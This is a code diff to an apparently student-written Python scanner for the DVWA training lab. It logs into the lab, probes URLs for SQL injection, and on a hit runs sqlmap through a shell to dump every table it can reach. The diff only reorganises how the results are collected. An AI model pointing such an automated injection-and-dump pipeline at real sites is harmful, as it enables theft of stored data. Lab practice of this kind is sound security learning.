@@ -42,11 +42,12 @@ def isVulnerable(response):
 
 
 def scanSQLInjection():
-    report = ""
+    database = []
     file = open('dirsearch_output_test.txt', 'r')
     file_contents = file.readlines()
     address = ""
     url = ""
+    injectableURLs = []
     s.cookies.set("PHPSESSID", getDVWALogin()['PHPSESSID'])
     s.cookies.set("security", "low")
 
@@ -94,13 +95,13 @@ def scanSQLInjection():
                 # Verification de la réponse pour déterminer la possibilité de l'injection
                 if isVulnerable(res):
                     res = s.get(url, params=sqlmapData)
+                    injectableURLs.append(res.url)
                     print("\t[✅] SQL Injection vulnerability detected, link:", res.url)
                     print('\t[i] Trying to dump database using sqlmap:')
                     print('\t\tInjection on ' + res.url)
                     command = "sqlmap -u '" + res.url + "' --cookie='PHPSESSID=" + getDVWALogin()['PHPSESSID'] + ";security=low' --dump --batch"
                     print(command)
                     process = Popen(command, shell=True, stdout=PIPE)
-                    report += res.url + " is an injectable form where we dumped this:"
                     for line in process.stdout:
                         if 'dumped to CSV file' in str(line): 
                             table = str(line).split(' ')[3]
@@ -108,14 +109,12 @@ def scanSQLInjection():
                             table = table[1:len(table)-1]
                             path = path[1:len(path)-4]
                             print('The '+ table + ' SQL table has been dumped:')
-                            report += 'The '+ table + ' SQL table has been dumped:'
                             f = open(path, 'r')
                             dump = f.read().replace(',', '\t|')
                             print(dump[:len(dump)-1])
-                            report += dump[:len(dump)-1]
+                            dump = 'The '+ table + ' SQL table has been dumped:\n'+ dump[:len(dump)-1]
+                            database.append(dump)
                     print('#####################################')
                     break 
                 else:
                     print("\t[❌] No vulnerability detected, link!")
-
-scanSQLInjection()
